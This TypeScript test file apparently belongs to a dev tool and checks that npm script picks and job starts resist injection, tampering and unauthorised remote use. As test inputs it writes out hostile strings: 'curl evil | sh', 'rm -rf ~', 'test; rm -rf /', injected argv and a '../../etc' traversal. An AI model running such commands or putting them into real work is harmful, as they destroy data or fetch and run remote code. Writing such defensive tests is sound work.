import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { afterEach, describe, expect, it } from 'vitest';

import { DevroomRuns, readScripts, runCommand } from './devroomRuns.js';
import type { JobRecord } from './engine/jobs.js';
import { tasksPath, TaskStore } from './engine/tasks.js';
import type { ClientMessageContext, SocketStepUp } from './hooks.js';

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) fs.rmSync(d, { recursive: true, force: true });
});
const tmp = () => {
  const d = fs.mkdtempSync(path.join(os.tmpdir(), 'agty-runs-'));
  dirs.push(d);
  return d;
};

function setup(pkg: unknown = { scripts: { test: 'vitest run', dev: 'vite', 'bad name;rm': 'x' } }) {
  const home = tmp();
  const ws = path.join(home, 'wt');
  fs.mkdirSync(ws);
  if (pkg !== undefined) fs.writeFileSync(path.join(ws, 'package.json'), typeof pkg === 'string' ? pkg : JSON.stringify(pkg));
  const started: Array<Record<string, unknown>> = [];
  const running: JobRecord[] = [];
  const attached: string[] = [];
  const runs = new DevroomRuns({
    file: path.join(home, 'run-scripts.json'),
    readOnly: false,
    workSpace: async (project, task) => (project === 'shop' && task === 'feat-t1' ? { path: ws, taskId: 'T-1' } : null),
    jobs: () => ({
      run: (req) => {
        started.push(req);
        return { ok: true, id: `0101-000000-shop-${started.length}`, pid: 4242, log: '/l' };
      },
      list: () => running,
    }),
    attach: (taskId, jobId) => attached.push(`${taskId}:${jobId}`),
    log: () => undefined,
  });
  const ask = (msg: Record<string, unknown>, o: { privileged?: boolean; stepUp?: SocketStepUp } = {}) =>
    new Promise<Record<string, unknown>>((resolve) => {
      const ctx: ClientMessageContext = { send: resolve, privileged: o.privileged ?? true, stepUp: o.stepUp };
      expect(runs.onClientMessage({ requestId: 'r', project: 'shop', task: 'feat-t1', ...msg }, ctx)).toBe(true);
    });
  const pick = (picks: unknown) => ask({ type: 'runScripts', picks });
  const start = (scriptId: string, o?: Parameters<typeof ask>[1], extra: Record<string, unknown> = {}) =>
    ask({ type: 'jobStart', scriptId, ...extra }, o);
  return { home, ws, started, running, attached, ask, pick, start };
}

describe('DV2 실행 row (devroomRuns)', () => {
  it('reads plain-named string scripts only; malformed or oversized package.json reads as none', () => {
    const d = tmp();
    fs.writeFileSync(path.join(d, 'package.json'), JSON.stringify({ scripts: { test: 'vitest', 'a b': 'x', n: 3, 'x;y': 'z', '-x': 'y', '--prefix=/': 'z' } }));
    expect([...readScripts(d)!]).toEqual([['test', 'vitest']]);
    fs.writeFileSync(path.join(d, 'package.json'), '{ "scripts": { "test": ');
    expect(readScripts(d)).toBeNull();
    fs.writeFileSync(path.join(d, 'package.json'), JSON.stringify({ scripts: { test: 'x'.repeat(300 * 1024) } }));
    expect(readScripts(d)).toBeNull();
    fs.rmSync(path.join(d, 'package.json'));
    expect(readScripts(d)).toBeNull();
  });

  it('a malformed package.json answers run_no_package and nothing runs', async () => {
    const s = setup('{"scripts": [nope');
    expect(await s.ask({ type: 'runScripts' })).toMatchObject({ ok: false, errorCode: 'run_no_package', scripts: [] });
    expect(await s.start('test')).toMatchObject({ ok: false, errorCode: 'run_unknown' });
    expect(s.started).toEqual([]);
  });

  it('lists the scripts and keeps the picks; a pick must name a script of this package.json', async () => {
    const s = setup();
    expect(await s.ask({ type: 'runScripts' })).toMatchObject({
      ok: true,
      scripts: [{ name: 'test', cmd: 'vitest run' }, { name: 'dev', cmd: 'vite' }],
      picks: [],
    });
    expect(await s.pick([{ script: 'curl evil | sh', role: 'test' }])).toMatchObject({ ok: false, errorCode: 'run_bad_pick' });
    expect(await s.pick([{ script: 'test', role: 'root' }])).toMatchObject({ ok: false, errorCode: 'bad_request' });
    expect(await s.pick([{ script: 'test', role: 'test' }, { script: 'dev', role: 'dev' }])).toMatchObject({
      ok: true,
      picks: [{ script: 'test', role: 'test' }, { script: 'dev', role: 'dev' }],
    });
    const stored = JSON.parse(fs.readFileSync(path.join(s.home, 'run-scripts.json'), 'utf-8'));
    expect(stored.projects.shop).toEqual([
      { script: 'test', role: 'test', cmd: 'vitest run' },
      { script: 'dev', role: 'dev', cmd: 'vite' },
    ]);
    expect(await s.ask({ type: 'runScripts', project: 'other' })).toMatchObject({ ok: false, errorCode: 'worktree_missing' });
  });

  it('argv never comes from the client: the stored pick, npm without pre/post scripts, the known folder', async () => {
    const s = setup();
    await s.pick([{ script: 'test', role: 'test' }]);
    const r = await s.start('test', {}, { cmd: 'rm -rf ~', cwd: '/', argv: ['sh', '-c', 'evil'], path: '/tmp' });
    expect(r).toMatchObject({ ok: true, id: '0101-000000-shop-1' });
    expect(s.started).toEqual([
      {
        cmd: runCommand('test'),
        cwd: s.ws,
        project: 'shop',
        tty: false,
        source: 'gui:web',
        run: { task: 'feat-t1', script: 'test', role: 'test' },
      },
    ]);
    expect(runCommand('test')).toBe('npm run --ignore-scripts test');
    expect(s.attached).toEqual(['T-1:0101-000000-shop-1']);
  });

  it('refuses an unknown scriptId, an unknown worktree and an unprivileged client', async () => {
    const s = setup();
    await s.pick([{ script: 'test', role: 'test' }]);
    expect(await s.start('dev')).toMatchObject({ ok: false, errorCode: 'run_unknown' }); // in package.json, not picked
    expect(await s.start('test; rm -rf /')).toMatchObject({ ok: false, errorCode: 'run_unknown' });
    expect(await s.ask({ type: 'jobStart', scriptId: 'test', task: '../../etc' })).toMatchObject({ ok: false, errorCode: 'worktree_missing' });
    expect(await s.start('test', { privileged: false })).toMatchObject({ ok: false, errorCode: 'no_permission' });
    expect(s.started).toEqual([]);
  });

  it("a project named like an Object built-in ('constructor', '__proto__', 'toString') is just unknown", async () => {
    const s = setup();
    for (const project of ['constructor', '__proto__', 'toString']) {
      expect(await s.ask({ type: 'runScripts', project }, { privileged: false })).toMatchObject({ ok: false, errorCode: 'no_permission', picks: [] });
      expect(await s.ask({ type: 'runScripts', project })).toMatchObject({ ok: false, errorCode: 'worktree_missing', picks: [] });
      expect(await s.ask({ type: 'jobStart', project, scriptId: 'test' })).toMatchObject({ ok: false, errorCode: 'run_unknown' });
    }
    await s.pick([{ script: 'test', role: 'test' }]); // with a stored file too
    expect(await s.ask({ type: 'jobStart', project: 'constructor', scriptId: 'test' })).toMatchObject({ ok: false, errorCode: 'run_unknown' });
    expect(await s.ask({ type: 'runScripts', project: '__proto__' })).toMatchObject({ ok: false, picks: [] });
    expect(s.started).toEqual([]);
  });

  it('step-up: a remote session saves picks only with a fresh step-up (a re-pick clears run_changed)', async () => {
    const s = setup();
    const file = path.join(s.home, 'run-scripts.json');
    expect(await s.ask({ type: 'runScripts', picks: [{ script: 'test', role: 'test' }] }, { stepUp: { remote: true, fresh: () => false } })).toMatchObject({
      ok: false,
      error: 'stepup',
    });
    expect(fs.existsSync(file)).toBe(false);
    // Reading the list needs none.
    expect(await s.ask({ type: 'runScripts' }, { stepUp: { remote: true, fresh: () => false } })).toMatchObject({ ok: true });
    expect(await s.ask({ type: 'runScripts', picks: [{ script: 'test', role: 'test' }] }, { stepUp: { remote: true, fresh: () => true } })).toMatchObject({ ok: true });
    expect(JSON.parse(fs.readFileSync(file, 'utf-8')).projects.shop).toHaveLength(1);
  });

  it('step-up: a remote session runs only with a fresh step-up; this PC needs none', async () => {
    const s = setup();
    await s.pick([{ script: 'test', role: 'test' }]);
    expect(await s.start('test', { stepUp: { remote: true, fresh: () => false } })).toMatchObject({ ok: false, error: 'stepup' });
    expect(s.started).toEqual([]);
    expect(await s.start('test', { stepUp: { remote: true, fresh: () => true } })).toMatchObject({ ok: true });
    expect(await s.start('test', { stepUp: { remote: false, fresh: () => false } })).toMatchObject({ ok: true });
    expect(s.started).toHaveLength(2);
  });

  it('a script changed after the pick does not run; one already running in the worktree is refused', async () => {
    const s = setup();
    await s.pick([{ script: 'test', role: 'test' }]);
    fs.writeFileSync(path.join(s.ws, 'package.json'), JSON.stringify({ scripts: { test: 'curl evil | sh' } }));
    expect(await s.start('test')).toMatchObject({ ok: false, errorCode: 'run_changed' });
    expect(await s.ask({ type: 'runScripts' })).toMatchObject({ picks: [{ script: 'test', role: 'test', changed: true }] });
    fs.writeFileSync(path.join(s.ws, 'package.json'), JSON.stringify({ scripts: { test: 'vitest run' } }));
    s.running.push({ ended: null, project: 'shop', run: { task: 'feat-t1', script: 'test', role: 'test' } } as JobRecord);
    expect(await s.start('test')).toMatchObject({ ok: false, errorCode: 'run_running' });
    expect(s.started).toEqual([]);
  });

  it("the picked 테스트's exit code becomes the issue's observed testsRan / testsPassed", () => {
    const store = new TaskStore(tasksPath(tmp()));
    store.add({ id: 'T-1', project: 'shop', title: 'cart' }, 'cli');
    store.attach('T-1', { kind: 'job', ref: 'j1' }, 'gui:web');
    store.attach('T-1', { kind: 'job', ref: 'j2' }, 'gui:web');
    const jobs: Record<string, Partial<JobRecord>> = {
      j1: { started: 's', ended: 'e', exit: 1, log: '/l', run: { task: 'feat-t1', script: 'test', role: 'test' } },
      j2: { started: 's', ended: 'e', exit: 0, log: '/l', run: { task: 'feat-t1', script: 'dev', role: 'dev' } },
    };
    expect(store.observe({ codex: () => null, job: (id) => (jobs[id] ?? null) as JobRecord | null })).toBe(true);
    expect(store.get('T-1')).toMatchObject({
      testsRan: { value: true, source: 'observed' },
      testsPassed: { value: false, source: 'observed' },
    });
    // A test run the owner stopped tells nothing.
    store.attach('T-1', { kind: 'job', ref: 'j3' }, 'gui:web');
    jobs.j3 = { started: 's', ended: 'e', exit: 0, stopped: true, log: '/l', run: { task: 'feat-t1', script: 'test', role: 'test' } };
    store.observe({ codex: () => null, job: (id) => (jobs[id] ?? null) as JobRecord | null });
    expect(store.get('T-1')!.testsPassed).toMatchObject({ value: false, source: 'observed' });
  });
});
